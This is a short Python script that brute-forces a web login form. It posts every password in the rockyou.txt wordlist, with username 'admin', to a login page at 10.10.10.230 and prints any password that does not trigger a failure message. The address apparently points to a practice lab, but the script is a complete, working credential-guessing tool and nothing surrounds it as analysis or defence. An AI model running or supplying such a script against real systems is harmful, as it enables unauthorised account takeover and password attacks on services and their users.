import requests

ip = "http://10.10.10.230/login"

pass_file = open('rockyou.txt', 'r')

count = 0
print 

for line in pass_file:
	# print(line.strip())
	password = line.strip()
	count += 1
	print(f"[*] Trying Password [{count}]: {password}", end="\r")
	data ={
		"username" : "admin",
		"password" : password
	}
	res = requests.post(ip, data=data)
	if "Login Failed!" not in res.text:
		print("[+] Password:" + str(password))


print("\n[!] Done!")